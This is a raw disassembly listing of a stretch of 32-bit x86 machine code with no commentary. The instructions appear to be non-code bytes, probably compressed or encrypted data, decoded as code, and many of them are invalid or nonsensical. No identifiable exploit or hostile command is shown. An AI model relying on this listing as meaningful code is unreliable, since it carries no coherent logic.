  409a51:	mov    BYTE PTR [edi+0x4989f5b9],ah
  409a57:	out    0x96,eax
  409a59:	loopne 0x409a78
  409a5b:	hlt    
  409a5c:	dec    ebp
  409a5d:	bnd jae 0x409a9d
  409a60:	xor    DWORD PTR [edx-0x44],eax
  409a63:	cmp    eax,0x27e5acfc
  409a68:	cmp    edi,DWORD PTR ds:[ecx+0x6e6e9eb0]
  409a6f:	sbb    ecx,ecx
  409a71:	mov    BYTE PTR [ecx],ch
  409a73:	xchg   edi,eax
  409a74:	add    BYTE PTR [edi-0x4f],al
  409a77:	inc    eax
  409a78:	add    edx,ebp
  409a7a:	cmp    al,0x12
  409a7c:	add    al,0xef
  409a7e:	(bad)  
  409a80:	push   ss
  409a81:	addr16 pop edi
  409a83:	dec    edi
  409a84:	mov    BYTE PTR [edx-0x71],dl
  409a87:	fild   QWORD PTR [edx]
  409a89:	iret   
  409a8a:	sbb    DWORD PTR [esi],eax
  409a8c:	push   0xd0453c23
  409a91:	popa   
  409a92:	pop    esp
  409a93:	popf   
  409a94:	mov    dh,0x5e
  409a96:	scas   al,BYTE PTR es:[edi]
  409a97:	pop    esp
  409a98:	jmp    0x3ad94031
  409a9d:	push   ebp
  409a9e:	pop    esi
  409a9f:	push   eax
  409aa0:	fwait
  409aa1:	dec    esp
  409aa2:	ficomp DWORD PTR [ebx+0x44]
  409aa5:	ret    0xdc36
  409aa8:	stc    
  409aa9:	mov    bh,0xd9
  409aab:	lods   al,BYTE PTR ds:[esi]
  409aac:	mov    edx,0x8f98193e
  409ab1:	sbb    ch,BYTE PTR [ebx-0x321b6e0a]
  409ab7:	or     al,0x6e
  409ab9:	lods   al,BYTE PTR ds:[esi]
  409aba:	pop    ss
  409abb:	dec    ebp
  409abc:	add    BYTE PTR [ebp-0x65],ah
  409abf:	leave  
  409ac0:	(bad)  
  409ac1:	jge    0x409a4a
  409ac3:	sbb    dh,BYTE PTR [edi-0x62405663]
  409ac9:	inc    ecx
  409aca:	xor    al,0xa6
  409acc:	xchg   ebp,eax
  409acd:	push   ebp
  409ace:	repnz pop es
  409ad0:	sbb    DWORD PTR fs:[ebp-0x4350e16b],ebp
  409ad7:	xor    DWORD PTR [ebx+edi*8],eax
  409ada:	xor    ch,BYTE PTR [ebx+0x5b]
  409add:	push   0xffffffbe
  409adf:	aam    0x4b
  409ae1:	jmp    0x86af:0x3a088702
  409ae8:	dec    ecx
  409ae9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409aea:	xor    bh,BYTE PTR [esi-0x26]
  409aed:	out    0xa8,eax
  409aef:	fisttp WORD PTR cs:[ebx-0x35]
  409af3:	mov    cl,0x27
  409af5:	jge    0x409b67
  409af7:	(bad)  
  409af8:	iret   
  409af9:	jmp    0x6e2d8a0e
  409afe:	clc    
  409aff:	pushf  
  409b00:	mov    bl,0xe6
  409b02:	push   eax
  409b03:	fisttp QWORD PTR [ebp+0x2a2e60a5]
  409b09:	add    ecx,DWORD PTR [ebx]
  409b0b:	xchg   BYTE PTR [ebp-0x78],bh
  409b0e:	fistp  WORD PTR [eax+0x3b608365]
  409b14:	lsl    ebx,WORD PTR [edi+0x3d3b1cfd]
  409b1b:	push   cs
  409b1c:	jno    0x409b09
  409b1e:	cmp    BYTE PTR [ebp+0x3f0da2d7],ah
  409b24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b25:	mov    bh,al
  409b27:	arpl   bp,bx
  409b29:	xor    eax,0x50dd99c
  409b2e:	or     cl,BYTE PTR [edx+0x33b42bd0]
  409b34:	or     al,0x37
  409b36:	mov    edx,0x29aa72cb
  409b3b:	pushf  
  409b3c:	fs lahf 
  409b3e:	test   eax,0xd000fd00
  409b43:	sbb    BYTE PTR [eax+0x38c1c332],dh
  409b49:	lahf   
  409b4a:	inc    ebp
  409b4b:	inc    edx
  409b4c:	sbb    al,0xd7
  409b4e:	sub    DWORD PTR [ebx+0x410dd101],ebx
  409b54:	adc    al,0x1d
  409b56:	and    ah,BYTE PTR [edx-0x4921d97d]
  409b5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b5e:	mov    sp,0xa05c
  409b62:	gs jno 0x409be4
  409b65:	sti    
  409b66:	pop    esi
  409b67:	aaa    
  409b68:	sbb    al,0x18
  409b6a:	push   ebp
  409b6b:	fdiv   DWORD PTR [ebx]
  409b6d:	imul   ebx,DWORD PTR [edi],0x94256acc
  409b73:	lahf   
  409b74:	and    esp,esp
  409b76:	inc    esp
  409b77:	adc    eax,0xd0871fc6
  409b7c:	lods   eax,DWORD PTR ds:[esi]
  409b7d:	pop    eax
  409b7e:	push   ss
  409b7f:	adc    dl,BYTE PTR [eax+0x53]
  409b82:	push   0x8bf5f359
  409b87:	add    eax,0x25bed45c
  409b8c:	ret    0x27b2
  409b8f:	adc    al,0xad
  409b91:	jns    0x409bef
  409b93:	or     edi,DWORD PTR fs:[edx-0x20885048]
  409b9a:	sub    BYTE PTR [esi+ecx*2-0x32a4cb4e],bh
  409ba1:	or     BYTE PTR [esi-0x61],ch
  409ba4:	dec    ebx
  409ba5:	inc    edi
  409ba6:	xor    esp,esp
  409ba8:	inc    edi
  409ba9:	jp     0x409b57
  409bab:	add    ch,BYTE PTR [edx+0x4ad4a7e]
  409bb1:	mov    dl,BYTE PTR [ebx+0x7fe9b07f]
  409bb7:	push   cs
  409bb8:	lahf   
  409bb9:	ror    BYTE PTR [ebp-0x221aeb7],1
  409bbf:	mov    al,0x4c
  409bc1:	lahf   
  409bc2:	int    0xa5
  409bc4:	stc    
  409bc5:	sbb    al,0xae
  409bc7:	les    ecx,FWORD PTR [ebx-0x605b5000]
  409bcd:	adc    esp,ecx
  409bcf:	jecxz  0x409b82
  409bd1:	jbe    0x409bbe
  409bd3:	xchg   edx,eax
  409bd4:	lds    ecx,FWORD PTR [ebx+0x3df3b949]
  409bda:	xor    DWORD PTR [edx+0x49],ebp
  409bdd:	lahf   
  409bde:	sub    al,0xae
  409be0:	lock jg 0x409b9d
  409be3:	fdiv   QWORD PTR [esi]
  409be5:	cmp    BYTE PTR [ebx],bl
  409be7:	push   edi
  409be8:	mov    ecx,0xc3f03572
  409bed:	sub    al,0xa3
  409bef:	call   0x15ba:0x689af30
  409bf6:	and    eax,eax
  409bf8:	pusha  
  409bf9:	adc    eax,0x7ed7c988
  409bfe:	stc    
  409bff:	pop    edi
  409c00:	(bad)  
  409c01:	jnp    0x409c2f
  409c03:	mov    eax,ds:0x3723b0a6
  409c08:	mov    esp,0x56f4e889
  409c0d:	and    edx,DWORD PTR [ebp+0x5c66bf03]
  409c13:	addr16 icebp 
  409c15:	sub    DWORD PTR ds:0xdc999f75,eax
  409c1b:	ret    0xf9ee
  409c1e:	cli    
  409c1f:	mov    edx,0x2958f193
  409c24:	out    dx,eax
  409c25:	mov    DWORD PTR [ecx],0x7827024
  409c2b:	jle    0x409c71
  409c2d:	mov    esp,0x2bc4fd14
  409c32:	inc    DWORD PTR [edx-0x52a730f9]
  409c38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c39:	ss test edi,ebx
  409c3c:	test   BYTE PTR [ebx+0x49a320c9],0xbf
  409c43:	mov    ds:0x62afefb7,al
  409c48:	mov    edx,0x921aa82d
  409c4d:	sub    BYTE PTR [eax-0x11],cl
  409c50:	xchg   esp,eax
  409c51:	icebp  
  409c52:	sbb    DWORD PTR [edx],ecx
  409c54:	ins    DWORD PTR es:[edi],dx
  409c55:	mov    eax,DWORD PTR [edx]
  409c57:	test   eax,0xa36b7b03
  409c5c:	in     eax,dx
  409c5d:	push   ecx
  409c5e:	jnp    0x409cb4
  409c60:	enter  0x3d44,0xcb
  409c64:	in     al,0x16
  409c66:	cmp    ah,bh
  409c68:	cmp    edi,edi
  409c6a:	pop    edi
  409c6b:	push   esi
  409c6c:	scas   al,BYTE PTR es:[edi]
  409c6d:	push   ebp
  409c6e:	adc    al,0x8b
  409c70:	add    BYTE PTR [edx+ecx*2+0x39],0xe3
  409c75:	dec    ebp
  409c76:	or     bh,ch
  409c78:	retf   
  409c79:	cmp    BYTE PTR ds:0xd0eb335c,ah
  409c7f:	jmp    0xb69f:0xaeed5670
  409c86:	out    dx,eax
  409c87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c88:	das    
  409c89:	fsub   st(3),st
  409c8b:	jl     0x409d03
  409c8d:	loopne 0x409c2a
  409c8f:	rol    ch,1
  409c91:	jge    0x409cd8
  409c93:	dec    ebp
  409c94:	cmp    DWORD PTR [ebx],edx
  409c96:	iret   
  409c97:	sub    eax,0x4546b147
  409c9c:	mov    ah,0x71
  409c9e:	scas   al,BYTE PTR es:[edi]
  409c9f:	inc    ebp
  409ca0:	jb     0x409c54
  409ca2:	popa   
  409ca3:	shl    BYTE PTR [ebx],cl
  409ca5:	xchg   edx,eax
  409ca6:	add    edi,DWORD PTR [ebx+0x74]
  409ca9:	mov    dh,0x7f
  409cab:	xchg   esi,eax
  409cac:	jmp    edi
  409cae:	in     al,0xdb
  409cb0:	mov    cl,0x17
  409cb2:	inc    edx
  409cb3:	ins    BYTE PTR es:[edi],dx
  409cb4:	fldln2 
  409cb6:	out    dx,eax
  409cb7:	dec    ecx
  409cb8:	adc    DWORD PTR [ebx+eiz*1+0xef94c37],ebp
  409cbf:	dec    edi
  409cc0:	jg     0x409d32
  409cc2:	mov    gs,WORD PTR [ebp+0x72db6547]
  409cc8:	mov    al,0x1e
  409cca:	jmp    0x253f:0xe167c6d6
  409cd1:	cdq    
  409cd2:	(bad)
  409cd5:	pop    ebp
  409cd6:	ret    0x151e
  409cd9:	popf   
  409cda:	xchg   esi,eax
  409cdb:	scas   eax,DWORD PTR es:[edi]
  409cdc:	mov    esp,0x57df0471
  409ce1:	test   al,al
  409ce3:	push   cs
  409ce4:	stos   DWORD PTR es:[edi],eax
  409ce5:	adc    al,0x8b
  409ce7:	sbb    al,0x4f
  409ce9:	jle    0x409d1a
  409ceb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cec:	jmp    eax
  409cee:	call   0xe1a30694
  409cf3:	adc    bl,BYTE PTR [edx+0x28affa4f]
  409cf9:	call   0xb5730fe4
  409cfe:	mov    DWORD PTR [esi+0x7a],ebp
  409d01:	jne    0x409cb1
  409d03:	mov    ch,0x70
  409d06:	neg    ecx
  409d08:	push   ds
  409d09:	jbe    0x409ca7
  409d0b:	sub    dl,BYTE PTR [ebp-0x49]
  409d0e:	test   ebx,edx
  409d10:	in     eax,dx
  409d11:	ss cdq 
  409d13:	push   0x350d78fa
  409d18:	out    dx,eax
  409d19:	sahf   
  409d1a:	jge    0x409d5e
  409d1c:	pusha  
  409d1d:	mov    edx,0x67955f5e
  409d22:	add    al,0x65
  409d24:	stos   DWORD PTR es:[edi],eax
  409d25:	cmp    al,0xcc
  409d27:	imul   ebx,DWORD PTR [eax+0x1bc0cfa4],0xffffff85
  409d2e:	outs   dx,DWORD PTR ds:[esi]
  409d2f:	adc    eax,0x415a31b2
  409d34:	loop   0x409d87
  409d36:	push   esi
  409d37:	dec    ebp
  409d38:	dec    edi
  409d39:	lods   eax,DWORD PTR ds:[esi]
  409d3a:	call   0x515b5b6b
  409d3f:	xor    bh,BYTE PTR [ebx]
  409d41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d42:	inc    esp
  409d43:	cmp    ch,BYTE PTR [esi+edx*4+0x6afe1586]
  409d4a:	fdivr  DWORD PTR [ecx-0x3778d053]
  409d50:	jbe    0x409dcc
  409d52:	mov    al,0x14
  409d54:	mov    bl,0x70
  409d56:	inc    ecx
  409d57:	sub    cl,bh
  409d59:	xor    eax,0x80c4a44f
  409d5e:	fcomp  DWORD PTR [ebx]
  409d60:	mov    ch,0x99
  409d62:	(bad)  
  409d65:	mov    cl,0xe2
  409d67:	scas   al,BYTE PTR es:[edi]
  409d68:	nop
  409d69:	fdivr  st(2),st
  409d6b:	pop    edi
  409d6c:	sub    DWORD PTR [esi+0x1cf1ab70],ebp
  409d72:	popf   
  409d73:	mov    DWORD PTR [ebx+0x1e],ebx
  409d76:	xor    DWORD PTR [ebp-0x13],eax
  409d79:	pop    esp
  409d7a:	cs (bad) 
  409d7c:	ror    BYTE PTR [edi],1
  409d7e:	test   eax,0xca9ae6ff
  409d83:	sbb    ah,dl
  409d85:	(bad)  
  409d87:	mov    al,ds:0xf8f9112
  409d8c:	mov    ecx,0x394d4083
  409d91:	jmp    0x409df2
  409d93:	xchg   ebp,eax
  409d94:	aad    0xd3
  409d96:	sbb    al,0xd1
  409d98:	pop    ecx
  409d99:	and    BYTE PTR [eax],al
  409d9b:	and    al,0xb
  409d9d:	ds (bad) 
  409d9f:	fnstcw WORD PTR [ecx+0x78126e97]
  409da5:	push   ds
  409da6:	mov    al,0x66
  409da8:	jge    0x409d3b
  409daa:	xor    eax,0x51acd486
  409daf:	enter  0x8787,0x4d
  409db3:	sub    cl,cl
  409db5:	sbb    al,0xf9
  409db7:	and    al,0x5
  409db9:	hlt    
  409dba:	mov    ecx,0x831e71b5
  409dbf:	imul   DWORD PTR fs:[esi+eiz*2]
  409dc3:	cmc    
  409dc4:	shr    BYTE PTR [ebx-0x3b],cl
  409dc7:	mov    ah,0xa6
  409dc9:	out    dx,al
  409dca:	cwde   
  409dcb:	jmp    0xc066:0x5d11f070
  409dd2:	jae    0x409d73
  409dd4:	(bad)  
  409dd6:	add    DWORD PTR es:[esi-0x3454467b],0xf9fc178
  409de1:	test   al,0xcf
  409de3:	scas   al,BYTE PTR es:[edi]
  409de4:	mov    ebp,0x141496ec
  409de9:	outs   dx,DWORD PTR ds:[esi]
  409dea:	pop    ss
  409deb:	test   DWORD PTR [esi],0xe7318202
  409df1:	mov    fs,WORD PTR [eax-0x3d542f4b]
  409df7:	sbb    cl,BYTE PTR [edi-0x4610ab97]
  409dfd:	add    edi,edx
  409dff:	cmp    cl,bh
  409e01:	jmp    0x409dba
  409e03:	sbb    BYTE PTR [edx+0x4d40d0a],0x5d
  409e0a:	mov    edi,0x1d81269a
  409e0f:	pop    ss
  409e10:	icebp  
  409e11:	mov    eax,ds:0x621897ba
  409e16:	xchg   esi,eax
  409e17:	loope  0x409e54
  409e19:	jnp    0x409e02
  409e1b:	loopne 0x409e87
  409e1d:	in     al,0x2
  409e1f:	pusha  
  409e20:	pop    ecx
  409e21:	jle    0x409e80
  409e23:	or     dl,dl
  409e25:	push   eax
  409e26:	cmp    al,0xb0
  409e28:	sub    bl,BYTE PTR [eax]
  409e2a:	gs iret 
  409e2c:	pop    ebp
  409e2d:	clc    
  409e2e:	call   0xe4ad:0xf4e55132
  409e35:	test   DWORD PTR [ebx-0x6c],0xc8dd5ee
  409e3c:	jle    0x409e10
  409e3e:	adc    BYTE PTR [eax],0x95
  409e41:	pop    ss
  409e42:	sbb    BYTE PTR [eax+0x43],al
  409e45:	outs   dx,BYTE PTR ds:[esi]
  409e46:	push   ecx
  409e47:	lods   eax,DWORD PTR ds:[esi]
  409e48:	fadd   DWORD PTR [edi+0x629e6b80]
  409e4e:	mov    WORD PTR [ebx+edi*2],?
  409e51:	ror    bl,0x2e
  409e54:	fwait
  409e55:	mov    bh,0x34
  409e57:	push   es
  409e58:	xchg   ebp,eax
  409e59:	rol    BYTE PTR [ebp+0x4c],0x5a
  409e5d:	xchg   DWORD PTR [esi],esp
  409e5f:	cmp    ebx,ebx
  409e61:	adc    DWORD PTR [ecx-0xa780f7e],esi
  409e67:	mov    dl,0xd6
  409e69:	(bad)  
  409e6a:	adc    edi,ecx
  409e6c:	push   cs
  409e6d:	push   esp
  409e6e:	mov    esp,0x8594a23
  409e73:	dec    edi
  409e74:	jmp    0x6b75:0xe9d72244
  409e7b:	ret    0x1c4f
  409e7e:	pop    esp
  409e7f:	nop
  409e80:	mov    ds:0xd16bfbad,eax
  409e85:	outs   dx,BYTE PTR ds:[esi]
  409e86:	rol    DWORD PTR [edx],1
  409e88:	ins    BYTE PTR es:[edi],dx
  409e89:	cmp    cl,BYTE PTR [ebp+edx*4+0x5d]
  409e8d:	call   0xd102:0x39113ef2
  409e94:	imul   BYTE PTR [esi]
  409e96:	or     dl,dl
  409e98:	dec    ebx
  409e99:	int    0xf0
  409e9b:	pop    ds
  409e9c:	int3   
  409e9d:	out    0x4e,eax
  409e9f:	adc    bl,BYTE PTR [esp+ebp*2-0x44]
  409ea3:	push   eax
  409ea4:	pop    ds
  409ea5:	adc    ch,ah
  409ea7:	or     al,0x4
  409ea9:	sub    eax,0xf00996af
  409eae:	outs   dx,BYTE PTR ds:[esi]
  409eaf:	jmp    0x7c3dc121
  409eb4:	pop    esi
  409eb5:	dec    edi
  409eb7:	repnz mov esi,0xefbae6f3
  409ebd:	jle    0x409ea9
  409ebf:	(bad)  
  409ec2:	repz or al,0xab
  409ec5:	jmp    0xefc49eba
  409eca:	or     ecx,ebp
  409ecc:	jecxz  0x409ea0
  409ece:	sub    al,0xa0
  409ed0:	cmp    eax,0x6fdac05c
  409ed5:	fwait
  409ed6:	popf   
  409ed7:	mov    ah,0xa4
  409ed9:	jb     0x409e7f
  409edb:	xchg   DWORD PTR [eax],esp
  409edd:	daa    
  409ede:	sbb    ch,ah
  409ee0:	stos   DWORD PTR es:[edi],eax
  409ee1:	fstp   DWORD PTR [eax-0x109fab6b]
  409ee7:	(bad)  
  409ee8:	or     bh,BYTE PTR [edx-0x2b]
  409eeb:	mov    al,0x61
  409eed:	cmp    DWORD PTR [eax-0x4e511b61],0x73
  409ef4:	mov    cl,0xb7
  409ef6:	pusha  
  409ef7:	fwait
  409ef8:	into   
  409ef9:	int3   
  409efa:	adc    DWORD PTR [ecx],eax
  409efc:	gs push ds
  409efe:	(bad)  
  409eff:	gs daa 
  409f01:	mov    al,ds:0x56821385
  409f06:	loop   0x409ec5
  409f08:	push   ebp
  409f09:	inc    ebp
  409f0a:	std    
  409f0b:	mov    ds:0x23691b39,al
  409f10:	test   DWORD PTR [edx+0x3a],edi
  409f13:	sbb    DWORD PTR [edx-0x552bc839],ecx
  409f19:	fwait
  409f1a:	pop    ebx
  409f1b:	mov    eax,ds:0x7223ac53
  409f20:	or     al,0xbb
  409f22:	call   0x8765:0xcd1bcfc7
  409f29:	bound  eax,QWORD PTR [esp+ebx*4-0xb]
  409f2d:	ja     0x409ed9
  409f2f:	cs mov eax,0xd563f6f
  409f35:	into   
  409f36:	inc    ebx
  409f37:	jmp    0xcd67e803
  409f3c:	in     eax,0x1b
  409f3e:	(bad)  
  409f3f:	and    BYTE PTR [ebp-0x53],bl
  409f42:	mov    cl,0x42
  409f44:	mov    eax,0x9dbf56a0
  409f49:	dec    edx
  409f4a:	mov    ss,esp
  409f4c:	ffree  st(5)
  409f4e:	jo     0x409f77
  409f50:	jb     0x409ee9
  409f52:	xor    BYTE PTR [ecx+0x77],ah
  409f55:	sbb    bl,bh
  409f57:	cmc    
  409f58:	(bad)  
  409f59:	jns    0x409faa
  409f5b:	(bad)  
  409f5c:	fcmovnb st,st(1)
  409f5e:	js     0x409f42
  409f60:	cmp    ch,BYTE PTR [edi]
  409f62:	xchg   BYTE PTR [edx],bl
  409f64:	xor    dl,BYTE PTR [esi+ecx*2+0x5a]
  409f68:	(bad)  
  409f69:	sub    eax,0x9bf075b6
  409f6e:	stos   BYTE PTR es:[edi],al
  409f6f:	fsub   QWORD PTR [edx+0x5b6949a4]
  409f75:	leave  
  409f76:	jg     0x409fc2
  409f78:	sbb    al,BYTE PTR [edi]
  409f7a:	cmc    
  409f7b:	push   0xffffff8e
  409f7d:	fcmove st,st(6)
  409f7f:	loopne 0x409f09
  409f81:	(bad)  
  409f82:	shl    DWORD PTR [esi-0x5a],1
  409f85:	cs pop edi
  409f87:	repz (bad) 
  409f89:	push   cs
  409f8a:	mov    esi,0x9a0ac5ce
  409f8f:	repz dec ecx
  409f91:	neg    DWORD PTR [ebp-0x80]
  409f94:	stos   DWORD PTR es:[edi],eax
  409f95:	adc    DWORD PTR [esi],esp
  409f97:	mov    al,0x2e
  409f99:	push   edi
  409f9a:	xlat   BYTE PTR ds:[ebx]
  409f9b:	xor    al,BYTE PTR [eax+eax*2-0xfc18657]
  409fa2:	jmp    0xeff8:0x61e21098
  409fa9:	and    bh,bh
  409fab:	xor    eax,0xc694615
  409fb0:	cmp    al,0xb0
  409fb2:	test   BYTE PTR [esi+0xadbfe39],0xa1
  409fb9:	add    al,BYTE PTR [ecx]
  409fbb:	push   edx
  409fbc:	daa    
  409fbd:	inc    edx
  409fbe:	bound  ecx,QWORD PTR [edi-0x2a]
  409fc1:	mov    ecx,0x8d8d338f
  409fc6:	lahf   
  409fc7:	test   DWORD PTR [ecx],eax
  409fc9:	push   ebx
  409fca:	or     BYTE PTR [eax+0x6bae342b],ch
  409fd0:	xchg   esp,eax
  409fd1:	mov    WORD PTR es:[edi],es
  409fd4:	xor    ebx,DWORD PTR [edx+ecx*1-0x8824e0]
  409fdb:	div    DWORD PTR [esp+edi*4+0x4a71e2d9]
  409fe2:	and    eax,0x39b245e9
  409fe7:	hlt    
  409fe8:	fdivr  QWORD PTR [ebx-0x46421bd9]
  409fee:	jecxz  0x40a02b
  409ff0:	ins    DWORD PTR es:[edi],dx
  409ff1:	pop    ecx
  409ff2:	lahf   
  409ff3:	dec    edx
  409ff4:	(bad)  
  409ff5:	(bad)  
  409ff6:	in     eax,0xae
  409ff8:	jnp    0x409fa7
  409ffa:	paddq  mm1,mm3
  409ffd:	retf   0xb41
  40a000:	test   BYTE PTR [ecx],dh
  40a002:	cmp    esp,DWORD PTR [ebp-0xf]
  40a005:	add    dl,dh
  40a007:	mov    al,ds:0xb4bb7d55
  40a00c:	jbe    0x40a065
  40a00e:	iret   
  40a00f:	push   eax
  40a010:	ret    0xe6f6
  40a013:	into   
  40a014:	jnp    0x40a093
  40a016:	sti    
  40a017:	jl     0x409ff2
  40a019:	add    al,BYTE PTR [ebx+ecx*4+0x4f414e22]
  40a020:	fld    TBYTE PTR [ecx-0x3b]
  40a023:	cdq    
  40a024:	fiadd  DWORD PTR [ecx-0x592af91e]
  40a02a:	cdq    
  40a02b:	stc    
  40a02c:	fidivr DWORD PTR [esi+eax*1-0x5ef9a06e]
  40a033:	xor    bh,al
  40a035:	or     al,0x7e
  40a037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a038:	add    eax,0xd5b90ff6
  40a03d:	pop    ebx
  40a03e:	ds hlt 
  40a040:	mov    eax,ds:0xb2ae5c42
  40a045:	sub    eax,0x7526d0ca
  40a04a:	out    0x9f,eax
  40a04c:	and    esi,edx
  40a04e:	jle    0x40a0c2
  40a050:	dec    eax
  40a051:	test   DWORD PTR [edx+0x4c8785d],ecx
  40a057:	stos   BYTE PTR es:[edi],al
  40a058:	cmp    eax,0x1ec6422
  40a05d:	xchg   BYTE PTR [edx+0x4c87bc79],bh
  40a063:	or     cl,cl
  40a065:	lods   al,BYTE PTR ds:[esi]
  40a066:	jl     0x40a021
  40a068:	(bad)  
  40a069:	(bad)  
  40a06a:	sub    bh,BYTE PTR [ebx+0xd55d6fc]
  40a070:	mov    ah,BYTE PTR [eax+0x3dee173b]
  40a076:	mov    ah,0x8e
  40a078:	test   eax,0xaf793715
  40a07d:	sahf   
  40a07e:	or     BYTE PTR [ecx-0x1d],cl
  40a081:	sbb    BYTE PTR [ebp+ecx*4-0x12],bl
  40a085:	pop    esp
  40a086:	out    dx,al
  40a087:	sub    ebx,DWORD PTR [eax]
  40a089:	fs inc esp
  40a08b:	ja     0x40a0b9
  40a08d:	xchg   BYTE PTR [edx+0x4bcefc43],cl
  40a093:	adc    al,0x53
  40a095:	or     ch,BYTE PTR [edx-0x58088fa0]
  40a09b:	data16 xchg BYTE PTR [esi-0x2231b070],dl
  40a0a2:	stos   WORD PTR es:[edi],ax
  40a0a4:	ror    BYTE PTR [edi],cl
  40a0a6:	sub    esi,esi
  40a0a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0a9:	adc    BYTE PTR [ebp+ebx*8+0x7d],0x1c
  40a0ae:	into   
  40a0af:	jmp    0x40a107
  40a0b1:	mov    al,0x7
  40a0b3:	cs mov ch,0xbf
  40a0b6:	inc    ebp
  40a0b7:	scas   eax,DWORD PTR es:[edi]
  40a0b8:	push   ds
  40a0b9:	cmp    edx,DWORD PTR [edx]
  40a0bb:	sub    DWORD PTR [ebx],ebx
  40a0bd:	loop   0x40a109
  40a0bf:	loop   0x40a0e2
  40a0c1:	mov    al,0xd9
  40a0c3:	push   ebp
  40a0c4:	sub    edx,DWORD PTR [ebp+0x7f]
  40a0c7:	pop    ebp
  40a0c8:	jo     0x40a147
  40a0ca:	jmp    0x40a11b
  40a0cc:	sub    eax,0x349ea413
  40a0d1:	xchg   edi,eax
  40a0d2:	stos   BYTE PTR es:[edi],al
  40a0d3:	into   
  40a0d4:	and    ebp,ebx
  40a0d6:	jmp    0x35c20fc0
  40a0db:	jmp    0x5717:0x34587e13
  40a0e2:	out    dx,eax
  40a0e3:	cmp    eax,0x9b6d796b
  40a0e8:	mov    al,0x98
  40a0ea:	das    
  40a0eb:	sbb    DWORD PTR [esi],esp
  40a0ed:	je     0x40a169
  40a0ef:	sub    bh,BYTE PTR ds:0xbcbeeb5
  40a0f5:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40a0f7:	inc    ecx
  40a0f8:	sub    al,0x47
  40a0fa:	ror    ch,0x94
  40a0fd:	mov    eax,ds:0x3f96b253
  40a102:	xchg   DWORD PTR [edx+0x1a],esi
  40a105:	add    esp,edi
  40a107:	sbb    ch,bh
  40a109:	adc    DWORD PTR [ebx],edi
  40a10b:	fwait
  40a10c:	adc    edx,DWORD PTR [esi+esi*4+0x47b86077]
  40a113:	cs xchg esp,eax
  40a115:	add    cl,BYTE PTR [edx]
  40a117:	lds    ebp,FWORD PTR [edi+0x4d7cd28b]
  40a11d:	int3   
  40a11e:	ror    DWORD PTR [eax+0x33],0x6b
  40a122:	cmp    dh,BYTE PTR [ebp-0x52]
  40a125:	xchg   ebp,eax
  40a126:	adc    al,0xd0
  40a128:	pop    ss
  40a129:	mov    al,0xec
  40a12b:	pop    esi
  40a12c:	cmp    BYTE PTR [eax-0x607bc720],cl
  40a132:	push   ss
  40a133:	test   eax,0x4080af55
  40a138:	and    al,0x40
  40a13a:	es popa 
  40a13c:	jp     0x40a13f
  40a13e:	fst    st(2)
  40a140:	lods   eax,DWORD PTR ds:[esi]
  40a141:	enter  0x3fd0,0xec
  40a145:	and    BYTE PTR [esi],0x5
  40a148:	daa    
  40a149:	pop    esi
  40a14a:	sub    dl,bh
  40a14c:	es jecxz 0x40a169
  40a14f:	and    al,0x3
  40a151:	push   es
  40a152:	dec    esp
  40a153:	sahf   
  40a154:	dec    eax
  40a155:	mov    ?,edi
  40a157:	enter  0xa5b4,0xe1
  40a15b:	psrlq  mm7,QWORD PTR [ebx-0x36]
  40a15f:	add    DWORD PTR [esi+0x71eedfd2],ebx
  40a165:	pop    esp
  40a166:	mov    dh,0x21
  40a168:	adc    esp,edx
  40a16a:	fcomp  QWORD PTR [ebp*8+0x27269d59]
  40a171:	fimul  DWORD PTR [ebx-0x117420fb]
  40a177:	aas    
  40a178:	stc    
  40a179:	mov    al,ds:0xb209959f
  40a17e:	dec    esp
  40a17f:	call   0x21ee:0x3a52b10f
  40a186:	pop    ebx
  40a187:	push   eax
  40a188:	and    eax,0xef3447a
  40a18d:	(bad)  
  40a18e:	cmp    esi,DWORD PTR [edi]
  40a190:	imul   ebx,DWORD PTR [edx-0x37d155d1],0xbc87e798
  40a19a:	sti    
  40a19b:	outs   dx,DWORD PTR gs:[esi]
  40a19d:	ins    DWORD PTR es:[edi],dx
  40a19e:	push   esp
  40a19f:	fstp   QWORD PTR [eax-0x6c91f3da]
  40a1a5:	mov    eax,ds:0x5bc15a4c
  40a1aa:	or     eax,0xaa57e6ce
  40a1af:	ret    
  40a1b0:	fstp   st(1)
  40a1b2:	xchg   edi,eax
  40a1b3:	rcr    DWORD PTR [ebx],0x2e
  40a1b6:	push   eax
  40a1b7:	pop    edx
  40a1b8:	push   es
  40a1b9:	inc    ebx
  40a1ba:	sub    ecx,DWORD PTR [eax-0x46]
  40a1bd:	fwait
  40a1be:	and    al,0xa1
  40a1c0:	test   BYTE PTR [ebx+0xb09e637],cl
  40a1c6:	test   eax,0x175f57ac
  40a1cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1cc:	(bad)  
  40a1cd:	popa   
  40a1ce:	inc    eax
  40a1cf:	adc    al,0x29
  40a1d1:	arpl   WORD PTR [ebp+0x78],di
  40a1d4:	repnz inc edx
  40a1d6:	test   bh,cl
  40a1d8:	cmp    eax,esi
  40a1da:	or     eax,0xe290e410
  40a1df:	sbb    BYTE PTR [esi+ebp*4],0x8
  40a1e3:	fidivr DWORD PTR [esi-0x5642da55]
  40a1e9:	jle    0x40a204
  40a1eb:	cmp    al,0x4d
  40a1ed:	test   DWORD PTR [esi],ebp
  40a1ef:	inc    esp
  40a1f0:	cmp    al,0x53
  40a1f2:	mov    ebx,0xf689c4c4
  40a1f7:	ret    0x7061
  40a1fa:	push   0xc0522f31
  40a1ff:	aam    0xae
  40a201:	leave  
  40a202:	xchg   ebx,eax
  40a203:	(bad)  
  40a204:	jmp    0x40a273
  40a206:	adc    ebx,eax
  40a208:	sub    ebx,ebx
  40a20a:	add    ebx,edx
  40a20c:	pop    eax
  40a20d:	cmp    ah,dh
  40a20f:	in     eax,dx
  40a210:	stos   BYTE PTR es:[edi],al
  40a211:	sar    BYTE PTR [ebp+0x6b],0x1c
  40a215:	cli    
  40a216:	in     al,0x93
